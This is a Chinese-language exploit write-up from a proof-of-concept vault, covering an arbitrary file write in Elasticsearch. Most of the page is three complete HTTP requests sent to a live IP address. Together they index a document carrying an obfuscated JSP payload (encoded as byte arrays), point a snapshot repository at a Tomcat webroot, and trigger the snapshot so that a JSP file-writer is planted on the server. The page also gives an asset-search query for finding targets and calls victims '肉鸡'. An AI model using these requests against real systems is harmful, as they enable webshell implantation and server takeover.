---
source: "wy876 漏洞文库"
---

# Elasticsearch存在任意文件写入漏洞

# 一、漏洞描述
Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。Elasticsearch存在任意文件写入漏洞

# 二、影响版本
Elasticsearch

# 三、资产测绘
```plain
app="Elasticsearch"
```


# 三、漏洞复现
1、创建一个恶意索引文档

```plain
POST /a.jsp/a.jsp/1 HTTP/1.1
Host: 123.58.224.8:32565
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 228

{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
```


2、再创建一个恶意的存储库，其中location的值即为要写入的路径（需要根据肉鸡的tomcat的www目录来决定）

```plain
PUT /_snapshot/a.jsp HTTP/1.1
Host: 123.58.224.8:32565
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

{
"type": "fs",
"settings": {
"location": "/usr/local/tomcat/webapps/wwwroot/",
"compress": false
}
}
```


3、存储库验证并创建

```plain
PUT /_snapshot/a.jsp/a.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

{
     "indices": "a.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}
```


4、写入jsp文件，这个jsp的文件是通过8080来访问的

```plain
/wwwroot/indices/a.jsp/snapshot-a.jsp?f=success
```


5、在www根目录下会生成一个test.jsp的文件，并会成功被写入success

```plain
/wwwroot/test.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ktd5oh8xdfle1g4c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
